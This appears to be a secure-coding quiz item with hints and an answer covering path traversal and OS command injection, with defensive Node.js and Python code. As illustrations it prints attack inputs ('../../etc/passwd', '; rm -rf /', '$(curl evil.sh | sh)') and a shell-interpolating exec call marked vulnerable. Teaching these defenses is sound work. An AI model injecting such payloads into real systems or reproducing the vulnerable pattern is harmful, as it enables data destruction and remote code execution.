## Hints

- What does `path.join('/srv/files', '../../etc/passwd')` resolve to?
- What's the difference between running a command through a shell and passing an argument array to the program?
- Do you even need to run a shell command for this task, or is there a library?

## Answer

Both happen when user input is used to build something the OS interprets.

**Path traversal**: input like `../../etc/passwd` or an absolute path escapes the directory you meant to serve. Fix: never use raw input as a path. Prefer IDs that map to stored paths. If you must accept file names, **resolve the full path and check it is still inside the base directory**:

```js
import path from 'node:path';
const BASE = path.resolve('/srv/files');

function safePath(userInput) {
  const full = path.resolve(BASE, userInput);
  if (!full.startsWith(BASE + path.sep)) throw new Error('Invalid path');
  return full;
}
```

```python
full = (BASE / user_input).resolve()
if not full.is_relative_to(BASE):
    raise ValueError("Invalid path")
```

Watch out for URL-encoded `%2e%2e%2f`, symlinks, and archive extraction (zip slip).

**OS command injection**: input is concatenated into a **shell** command, so `; rm -rf /` or `$(curl evil.sh | sh)` runs.

```js
exec(`convert ${file} out.png`);              // vulnerable: goes through /bin/sh
execFile('convert', [file, 'out.png']);       // args passed directly, no shell
```

```python
subprocess.run(["convert", file, "out.png"], check=True)   # no shell=True
```

Defenses, best first:

1. Use a **library** instead of shelling out (e.g. `sharp`, Pillow).
2. Use **argument arrays without a shell** (`execFile`/`spawn`, `subprocess.run([...])`).
3. **Allow-list** input values; put `--` before positional args so input can't become an option (`-o/etc/x`).
4. Run with **least privilege**: unprivileged user, read-only filesystem in containers, and Node's permission model (`--permission --allow-fs-read=...`) as defense in depth.

**Follow-up:** Why is escaping input yourself a bad idea? Shell quoting rules are subtle; avoiding the shell removes the whole class of bugs.
